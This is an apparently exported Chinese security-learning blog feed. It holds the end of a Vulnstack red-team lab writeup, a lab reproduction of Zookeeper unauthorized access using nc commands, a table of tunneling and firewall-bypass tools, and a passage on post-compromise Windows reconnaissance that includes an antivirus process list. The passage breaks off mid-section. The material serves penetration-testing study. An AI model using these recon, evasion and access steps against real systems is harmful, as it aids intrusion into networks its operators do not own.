alt="image-20210112204720337"></p><p><a href="http://192.168.247.133/yxcms/index.php?r=admin/index/login" target="_blank" rel="noopener">http://192.168.247.133/yxcms/index.php?r=admin/index/login</a> admin/123456</p><p>后台任意文件写入getshell</p><p><img src="/imgs/image-20210112204813073.png" alt="image-20210112204813073"></p><h3 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h3><p><a href="https://chaceshadow.github.io/2020/09/28/ATC-CK-Vulnstack-1/" target="_blank" rel="noopener">ATK&amp;CK红队评估实战靶场（一）的搭建和模拟攻击过程</a><br><a href="http://www.dtmao.cc/news_show_128035.shtml" target="_blank" rel="noopener">ATT&amp;cK实战系列—红队实战(一)</a><br><a href="https://www.jianshu.com/p/d9930311303f" target="_blank" rel="noopener">metasploit与Cobaltstrike互相派生shell</a><br><a href="https://www.freebuf.com/articles/network/125278.html" target="_blank" rel="noopener">vulnstack1</a><br><a href="https://www.cnblogs.com/chenglee/p/9259426.html" target="_blank" rel="noopener">kali meterpreter中mimikatz模块获取密码</a><br><a href="https://www.anquanke.com/post/id/170360,https://www.freebuf.com/articles/web/237263.html" target="_blank" rel="noopener">Redis在Windows下的利用</a></p>]]></content>
      
      
      <categories>
          
          <category> vulstack </category>
          
          <category> vulstack1 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网安全 </tag>
            
            <tag> vulnstack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zookeeper 未授权访问漏洞复现</title>
      <link href="2020/12/07/Zookeeper-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/12/07/Zookeeper-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>zookeeper，它是一个分布式服务框架，是Apache Hadoop 的一个子项目，它主要是用来解决分布式应用中经常遇到的一些数据管理问题，如：统一命名服务、状态同步服务、集群管理、分布式应用配置项的管理等。</p><p>简单来说zookeeper=文件系统+监听通知机制。</p></blockquote><h4 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h4><p>靶机：centos7.3</p><p>攻击者：kali2020</p><p>在靶机搭建环境步骤：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#下载安装包</span></span><br><span class="line">wget http://archive.apache.org/dist/zookeeper/zookeeper-3.4.10/zookeeper-3.4.10.tar.gz</span><br><span class="line"><span class="comment">#解压</span></span><br><span class="line">tar -xvf zookeeper-3.4.10.tar.gz</span><br><span class="line"><span class="comment">#拷贝配置文件</span></span><br><span class="line"><span class="built_in">cd</span> zookeeper-3.4.10/conf &amp;&amp; cp zoo_sample.cfg zoo.cfg</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动zookeeper</span></span><br><span class="line"><span class="built_in">cd</span> ../bin/ &amp;&amp; ./zkServer.sh start</span><br><span class="line"><span class="comment">#尝试本地连接，显示[zk: localhost:2181(CONNECTED) 0] 则成功连接</span></span><br><span class="line">./zkCli.sh -server localhost:2181</span><br></pre></td></tr></table></figure><p>在攻击环境搭建步骤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#下载安装包</span><br><span class="line">wget http:&#x2F;&#x2F;archive.apache.org&#x2F;dist&#x2F;zookeeper&#x2F;zookeeper-3.4.10&#x2F;zookeeper-3.4.10.tar.gz</span><br><span class="line">#解压</span><br><span class="line">tar -xvf zookeeper-3.4.10.tar.gz</span><br></pre></td></tr></table></figure><h4 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h4><p>zookeeper 支持某些特定的四字命令与其交互，用户获取 zookeeper 服务的当前状态及相关信息，用户在客户端可以通过 telenet 或者 nc（netcat） 向 zookeeper 提交相应的命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#四字命令格式</span><br><span class="line">echo [command] | nc [ip] [port]</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201207124113008.png" alt="image-20201207124113008"></p><h4 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h4><p>在kali的zookeeper目录下执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#执行envi命令获取系统敏感信息：系统名称、Java环境</span></span><br><span class="line"><span class="built_in">echo</span> envi|nc 192.168.116.132 2181</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201207123613986.png" alt="image-20201207123613986"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> bin/&amp;&amp;/zkCli.sh -server 192.168.116.132:2181</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201207135447619.png" alt="image-20201207135447619"></p><p>参考链接：</p><p><a href="https://blog.csdn.net/java_66666/article/details/81015302" target="_blank" rel="noopener">https://blog.csdn.net/java_66666/article/details/81015302</a></p><p><a href="https://www.cnblogs.com/glowing-z/p/12333334.html" target="_blank" rel="noopener">https://www.cnblogs.com/glowing-z/p/12333334.html</a></p><p><a href="https://www.runoob.com/w3cnote/zookeeper-sc-4lw.html" target="_blank" rel="noopener">https://www.runoob.com/w3cnote/zookeeper-sc-4lw.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Zookeeper </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 未授权 </tag>
            
            <tag> Zookeeper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习笔记-Ⅲ：隐藏通信隧道技术</title>
      <link href="2020/12/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A2%EF%BC%9A%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"/>
      <url>2020/12/05/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A2%EF%BC%9A%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h3 id="工具列表"><a href="#工具列表" class="headerlink" title="工具列表"></a>工具列表</h3><table><thead><tr><th>工具</th><th>操作系统</th><th>功能</th><th>下载链接</th><th>使用参考</th></tr></thead><tbody><tr><td>socat</td><td>Linux</td><td>IPV6隧道工具，socat的主要特点就是在两个数据流之间建立通道；且支持众多协议和链接方式：ip, tcp, udp, ipv6, pipe,exec,system,open,proxy,openssl,socket等。</td><td><a href="http://www.dest-unreach.org/socat/download/" target="_blank" rel="noopener">http://www.dest-unreach.org/socat/download/</a></td><td></td></tr><tr><td>icmptunnel</td><td>Linux</td><td>icmptunnel是一个将IP流量封装到ICMP echo请求和回复（ping）包中的隧道工具，是在允许ping的网络中进行拓展、绕过防火墙的一种半隐蔽方式。icmptunnel是通过创建虚拟网卡，将所有流量都经过这个虚拟网卡，所以需要高级权限才能使用此工具。</td><td><a href="https://github.com/DhavalKapil/icmptunnel" target="_blank" rel="noopener">https://github.com/DhavalKapil/icmptunnel</a></td><td><a href="https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/" target="_blank" rel="noopener">https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/</a></td></tr><tr><td>PingTunnel</td><td>Linux、Windows</td><td>网络层，利用ICMP协议。把tcp/udp/sock5流量伪装成icmp流量进行转发。为避免滥用为隧道设置密码。</td><td><a href="http://freshmeat.sourceforge.net/projects/ptunnel/" target="_blank" rel="noopener">http://freshmeat.sourceforge.net/projects/ptunnel/</a></td><td><a href="https://mp.weixin.qq.com/s/LguEfKVg_adzQRyho-sYKw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/LguEfKVg_adzQRyho-sYKw</a></td></tr><tr><td>LCX</td><td>Windows</td><td>传输层，Linux版是portmap。基于socket套接字实现的端口转发工具。</td><td></td><td></td></tr><tr><td>netcat</td><td>Linux、Windows</td><td>传输层。简称nc，网络瑞士军刀</td><td><a href="http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download" target="_blank" rel="noopener">http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download</a></td><td></td></tr><tr><td>PowerCat</td><td>Windows</td><td>nc的Powershell版</td><td><a href="https://github.com/besimorhino/powercat/" target="_blank" rel="noopener">https://github.com/besimorhino/powercat/</a></td><td></td></tr><tr><td>SSH(MobaXterm)</td><td>MobaXterm for Windows</td><td>应用层，利用SSH协议</td><td><a href="https://mobaxterm.mobatek.net/download.html" target="_blank" rel="noopener">https://mobaxterm.mobatek.net/download.html</a></td><td></td></tr><tr><td>reduh</td><td>JAVA环境</td><td>内网服务器的端口通过http或https隧道转发到本机，形成一个TCP连通回路，用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部端口的工具</td><td><a href="https://github.com/sensepost/reDuh" target="_blank" rel="noopener">https://github.com/sensepost/reDuh</a></td><td></td></tr><tr><td>reGeorg</td><td>Python环境</td><td>应用层，利用HTTP协议，reduh升级版。把内网服务器端口的数据通过HTTP隧道转发到本机，实现基于HTTP协议的通信。</td><td><a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></td><td></td></tr><tr><td>meterpreter</td><td></td><td>应用层，利用HTTP协议</td><td></td><td></td></tr><tr><td>tunna</td><td>Python环境</td><td>应用层，利用HTTP协议</td><td><a href="https://github.com/SECFORCE/Tunna" target="_blank" rel="noopener">https://github.com/SECFORCE/Tunna</a></td><td></td></tr><tr><td>冰蝎</td><td>Linux、Windows、Mac OS</td><td>应用层，利用HTTP协议</td><td><a href="https://github.com/rebeyond/Behinder" target="_blank" rel="noopener">https://github.com/rebeyond/Behinder</a></td><td></td></tr><tr><td>dnscat2</td><td>Linux、Windows</td><td>应用层，利用DNS协议。dnscat2是基于DNS协议的通信工具，一般的通信工具基于TCP等的传输方式非常容易被防火墙拦截，但是dnscat2基于DNS的查询与响应报文一般不会被拦截，而且可以完成信息传输。</td><td><a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2</a></td><td><a href="https://www.anquanke.com/post/id/183761" target="_blank" rel="noopener">https://www.anquanke.com/post/id/183761</a></td></tr><tr><td>iodine</td><td>Linux、Windows、Mac OS</td><td>应用层，利用DNS协议。Iodine是一款DNS隧道制造工具，通过一台DNS服务器就可以为我们建立一个IPv4的数据通道，该工具常被渗透测试人员用于防火墙绕过等场景。</td><td><a href="https://github.com/Al1ex/iodine" target="_blank" rel="noopener">https://github.com/Al1ex/iodine</a></td><td><a href="https://www.freebuf.com/articles/system/178214.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/178214.html</a></td></tr><tr><td>frp</td><td>Linux、Windows、Mac OS</td><td>frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</td><td><a href="https://github.com/fatedier/frp/" target="_blank" rel="noopener">https://github.com/fatedier/frp/</a></td><td><a href="https://mp.weixin.qq.com/s/ai8IFbSlr7gkLRj8xNaESg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ai8IFbSlr7gkLRj8xNaESg</a></td></tr><tr><td>NPS</td><td>Linux、Windows</td><td>支持tcp，udp，socks5，http等几乎所有流量转发，可以访问内部网网站，本地支付接口调试，ssh访问，远程桌面的一个轻量级，高性能，功能强大的内网扩展代理服务器。 ，内网dns解析，内网socks5代理等等……，并具有功能强大的内网渗透代理服务器，并具有功能强大的网络管理终端。</td><td><a href="https://github.com/ehang-io/nps/" target="_blank" rel="noopener">https://github.com/ehang-io/nps/</a></td><td><a href="https://mp.weixin.qq.com/s/pB7mVZfDebMBb4rRXqM6FA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/pB7mVZfDebMBb4rRXqM6FA</a></td></tr><tr><td>EarthWorm</td><td>Linux、Windows、Mac OS</td><td>SOCKS 5。Earthworm(简称EW)是一套轻量便携且功能强大的网络穿透工具，基于标准C开发，具有socks5代理、端口转发和端口映射三大功能。</td><td><a href="https://github.com/rootkiter/EarthWorm" target="_blank" rel="noopener">https://github.com/rootkiter/EarthWorm</a></td><td><a href="https://www.freebuf.com/sectool/234254.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/234254.html</a></td></tr><tr><td>sSocks</td><td>Linux、Windows、Mac OS</td><td>(ShadowSOCKS、影梭)</td><td><a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="noopener">http://sourceforge.net/projects/ssocks/</a></td><td><a href="https://shadowsockshelp.github.io/Shadowsocks/" target="_blank" rel="noopener">https://shadowsockshelp.github.io/Shadowsocks/</a></td></tr><tr><td>SocksCap64</td><td>Windows</td><td>Shadowsocks 的全局代理并非真正的全局代理，它只应用于本身支持 Socks5 代理的应用程序。若应用程序本身不支持，则不走代理。与 SocksCap64 搭配使用后，无论软件是否支持，都走代理。</td><td><a href="http://www.sockscap64.com/" target="_blank" rel="noopener">http://www.sockscap64.com/</a></td><td><a href="https://blog.augustdoit.men/sockscap64/" target="_blank" rel="noopener">https://blog.augustdoit.men/sockscap64/</a></td></tr><tr><td>Proxifier</td><td>Linux、Windows、Mac OS</td><td>Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。支持 64位系统，支持Xp，Vista，Win7，MAC OS ,支持socks4，socks5，http代理协议，支持TCP，UDP协议，可以指定端口，指定IP，指定域名，指定程序等运行模式，兼容性非常好。</td><td><a href="https://www.proxifier.com/" target="_blank" rel="noopener">https://www.proxifier.com/</a></td><td><a href="https://blog.csdn.net/u013066730/article/details/88788191" target="_blank" rel="noopener">https://blog.csdn.net/u013066730/article/details/88788191</a></td></tr><tr><td>ProxyChains</td><td>Linux</td><td>SOCKS 4、SOCKS 5。ProxyChains是一个开源代理工具，能够强制使任何应用的TCP连接使用SOCKS4、SOCKS或者HTTP(S)代理进行连接。</td><td><a href="http://proxychains.sourceforge.net/" target="_blank" rel="noopener">http://proxychains.sourceforge.net/</a></td><td><a href="https://www.fujieace.com/kali-linux/proxychains.html" target="_blank" rel="noopener">https://www.fujieace.com/kali-linux/proxychains.html</a></td></tr><tr><td>ngrok</td><td>Linux、Windows、Mac OS</td><td>反向代理。<a href="https://ngrok.com/" target="_blank" rel="noopener">ngrok</a>是一个反向代理，它能够让你本地的web服务或tcp服务通过公共的端口和外部建立一个安全的通道，使得外网可以访问本地的计算机服务。ngrok1.x开源，ngrok2.x不开源。</td><td><a href="https://ngrok.com/download" target="_blank" rel="noopener">https://ngrok.com/download</a></td><td><a href="https://luozm.github.io/ngrok" target="_blank" rel="noopener">https://luozm.github.io/ngrok</a></td></tr></tbody></table><h3 id="隧道原理"><a href="#隧道原理" class="headerlink" title="隧道原理"></a>隧道原理</h3><blockquote><p>隐藏隧道技术通常用于在访问受限的网络环境中追踪数据流向和在非受信任的网络中实现安全的数据传输。</p><p>隧道是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙允许的数据包类型或端口进行封装，然后穿过防火墙，与对方通信。当被封装的数据包到达目的地时，对数据包进行还原，并将还原后的数据包发送到相应服务器。</p><p>内网穿透：利用各种隧道技术，以网络防火墙允许的协议，绕过网络防火墙的封锁，实现访问被封锁的目标网络</p><p>常用的隧道：</p><p>网络层：IPv6隧道、<a href="https://mp.weixin.qq.com/s/LguEfKVg_adzQRyho-sYKw" target="_blank" rel="noopener">ICMP隧道</a>、GRE隧道；</p><p>传输层：TCPD隧道、UDP隧道、常规端口转发；</p><p>应用层：SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道、SOCKS隧道。</p></blockquote><p>最后附上 hackingday AnonySec大佬的思维导图：</p><p><img src="/imgs/image-20201228160947627.png" alt="image-20201228160947627"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网安全 </tag>
            
            <tag> 隐藏通信隧道技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习笔记-Ⅱ:内网信息收集</title>
      <link href="2020/12/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A1%EF%BC%9A%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>2020/12/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A1%EF%BC%9A%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><table><thead><tr><th>主要部分</th><th>知识点</th></tr></thead><tbody><tr><td>收集本机信息</td><td>主要收集操作系统、权限、内网IP地址段、杀毒软件、端口、服务、补丁及更新频率、网络连接、共享、会话等，可采用手动和自动收集两种方式</td></tr><tr><td>查询当前权限</td><td>主要收集当前用户权限、域SID、或者某些指定用户信息</td></tr><tr><td>判断是否存在域</td><td>主要通过查询ipconfig、systeminfo等命令获取信息判断是否在域内</td></tr><tr><td>探测域内存活主机</td><td>探测内网或域内存活主机，利用netbios、icmp或者ARP进行探测</td></tr><tr><td>扫描域内端口</td><td>探测主机存活端口、服务，为后续内网漏洞探测利用做准备</td></tr><tr><td>收集域内基础信息</td><td>收集域内基础信息，包括域名、域内主机、域控等</td></tr><tr><td>查找域控制器</td><td>定位域控制器</td></tr><tr><td>获取域内的用户和管理员信息</td><td>查询域内用户、域内管理员等信息</td></tr><tr><td>定位域管理员</td><td></td></tr><tr><td>查找域管理进程</td><td>收集域管理进程，可以查找登录进程，进而收集域管理员的凭据</td></tr><tr><td>利用powershell收集域信息</td><td></td></tr><tr><td>敏感资料</td><td>收集本机或域的敏感资料</td></tr><tr><td>分析域内网段划分情况及拓扑结构</td><td>根据收集的信息分析、画出内网及域拓扑</td></tr><tr><td>域分析工具BloodHound</td><td>利用BloodHound进行域内情况分析</td></tr><tr><td>域内信息收集-Linux主机</td><td>收集Linux主机信息</td></tr></tbody></table><blockquote><p>信息收集是内网渗透的关键。进入内网后的第一步就是信息收集，而且信息收集往往一直贯穿整个内网渗透过程。</p><p>进入内网后，一般首先会对本机和内部网络进行信息收集。包括本机：网络配置及连接情况、翻文件、找命令执行历史记录、配置文件、数据库信息、管理员登录信息、总结密码规律、用户相关信息等；对内部网络/其它主机：存活IP、主机名、开放端口和服务等。利用收集到的信息主要针对未修复漏洞、弱点等来横向渗透扩大战果。</p><p>内网漫游可以重点关注<strong>邮件服务器、OA系统、版本控制服务器、集中运维管理平台、统一认证系统、域控</strong>等，尝试突破核心系统权限、核心业务和核心数据。</p></blockquote><blockquote><p>刚进入内网，很多信息都不知道，面对的是一片黑暗森林。所以往往第一步就是对当前网络环境分析。</p><p>我是谁？（角色）</p><p>这是哪？（网络拓扑）</p><p>我在哪？（所处网络）</p></blockquote><h3 id="1、收集本机信息"><a href="#1、收集本机信息" class="headerlink" title="1、收集本机信息"></a>1、收集本机信息</h3><blockquote><p>本机信息收集包括操作系统、权限、内网IP地址段、杀毒软件、端口、服务、补丁及更新频率、网络连接、共享、会话等，针对域内主机，一般操作系统、应用软件、补丁、服务、杀毒软件都是批量安装的。</p></blockquote><p>本机信息收集可采用手动收集和工具自动收集。</p><h4 id="手动收集"><a href="#手动收集" class="headerlink" title="手动收集"></a>手动收集</h4><h5 id="查询网络配置"><a href="#查询网络配置" class="headerlink" title="查询网络配置"></a>查询网络配置</h5><p>根据ipconfig查询本机网络配置信息，可以看到有几个网卡，每个网卡的IP配置，是否有域，域名及DNS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223105057849.png" alt="image-20201223105057849"></p><h5 id="查询操作系统及版本"><a href="#查询操作系统及版本" class="headerlink" title="查询操作系统及版本"></a>查询操作系统及版本</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo|findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot;</span><br><span class="line">systeminfo|findstr &#x2F;B &#x2F;C:&quot;OS 名称&quot; &#x2F;C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223105906826.png" alt="image-20201223105906826"></p><p>另外利用systeminfo也可以查询<strong>主机名、网卡、域、补丁</strong>等信息。当域不是<code>WORKGROUP</code>，主机就是真实在域内的。</p><p><img src="/imgs/image-20201223110459966.png" alt="image-20201223110459966"></p><h5 id="查看系统体系结构"><a href="#查看系统体系结构" class="headerlink" title="查看系统体系结构"></a>查看系统体系结构</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223110926476.png" alt="image-20201223110926476"></p><h5 id="查看安装的软件信息"><a href="#查看安装的软件信息" class="headerlink" title="查看安装的软件信息"></a>查看安装的软件信息</h5><p>可以利用WMIC（Windows Management InstrumentationCommand Line）或者powershell来查看安装的软件信息</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br><span class="line">powershell <span class="string">"Get-WmiObject -class Win32_Product | Select-Object -Property name,version"</span></span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223112228040.png" alt="image-20201223112228040"></p><h5 id="查询本机服务信息"><a href="#查询本机服务信息" class="headerlink" title="查询本机服务信息"></a>查询本机服务信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223112918846.png" alt="image-20201223112918846"></p><h5 id="查询进程列表"><a href="#查询进程列表" class="headerlink" title="查询进程列表"></a>查询进程列表</h5><p>tasklist可以查看当前进程列表和进程用户，分析软件、邮件客户端、VPN、杀毒软件进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223113256602.png" alt="image-20201223113256602"></p><p>常见的杀毒软件进程，另外附上别人总结的杀软进程名：<a href="https://www.cnblogs.com/hookjoy/p/10899119.html" target="_blank" rel="noopener">https://www.cnblogs.com/hookjoy/p/10899119.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">360sd.exe 360杀毒</span><br><span class="line">360tray 360实时保护</span><br><span class="line">ZhuDongFangYu.exe 360主动防御</span><br><span class="line">KSafeTray.exe 金山卫士</span><br><span class="line">SafeDogUpdateCenter.exe 服务器安全狗</span><br><span class="line">HipsTray.exe 火绒</span><br><span class="line">McAfee McShield.exe McAfee</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h5 id="查看启动程序信息"><a href="#查看启动程序信息" class="headerlink" title="查看启动程序信息"></a>查看启动程序信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223123133215.png" alt="image-20201223123133215"></p><h5 id="查看计划任务"><a href="#查看计划任务" class="headerlink" title="查看计划任务"></a>查看计划任务</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223124018255.png" alt="image-20201223124018255"></p><h5 id="查看主机开机时间"><a href="#查看主机开机时间" class="headerlink" title="查看主机开机时间"></a>查看主机开机时间</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223123600451.png" alt="image-20201223123600451"></p><h5 id="查询用户列表"><a href="#查询用户列表" class="headerlink" title="查询用户列表"></a>查询用户列表</h5><p>查看本机用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223124038567.png" alt="image-20201223124038567"></p><p>获取本地管理员信息（包括域用户）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223124201706.png" alt="image-20201223124201706"></p><p>查看当前在线用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223124301472.png" alt="image-20201223124301472"></p><p>列出本地计算机和连接的客户端的会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223145506781.png" alt="image-20201223145506781"></p><p><strong>查询端口</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223145705625.png" alt="image-20201223145705625"></p><h5 id="查询补丁及其更新频率"><a href="#查询补丁及其更新频率" class="headerlink" title="查询补丁及其更新频率"></a>查询补丁及其更新频率</h5><p>对于补丁，需要注意系统的版本、位数、域、补丁信息和更新频率。域内主机补丁通常会批量安装，通过查看补丁列表，可以找出未打补丁的漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223150013635.png" alt="image-20201223150013635"></p><p><img src="/imgs/image-20201223150057679.png" alt="image-20201223150057679"></p><h5 id="查询本机共享列表"><a href="#查询本机共享列表" class="headerlink" title="查询本机共享列表"></a>查询本机共享列表</h5><p>查看本机共享列表和可访问的域共享列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223150358346.png" alt="image-20201223150358346"></p><p><img src="/imgs/image-20201223150518040.png" alt="image-20201223150518040"></p><h5 id="查询路由表及所有可用接口的ARP缓存表"><a href="#查询路由表及所有可用接口的ARP缓存表" class="headerlink" title="查询路由表及所有可用接口的ARP缓存表"></a>查询路由表及所有可用接口的ARP缓存表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223150818378.png" alt="image-20201223150818378"></p><p><img src="/imgs/image-20201223150841184.png" alt="image-20201223150841184"></p><h5 id="查看代理配置情况"><a href="#查看代理配置情况" class="headerlink" title="查看代理配置情况"></a>查看代理配置情况</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223151207277.png" alt="image-20201223151207277"></p><h5 id="查询并开启远程服务"><a href="#查询并开启远程服务" class="headerlink" title="查询并开启远程服务"></a>查询并开启远程服务</h5><p>查看远程连接端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201223151533013.png" alt="image-20201223151533013"></p><p>在windows Server 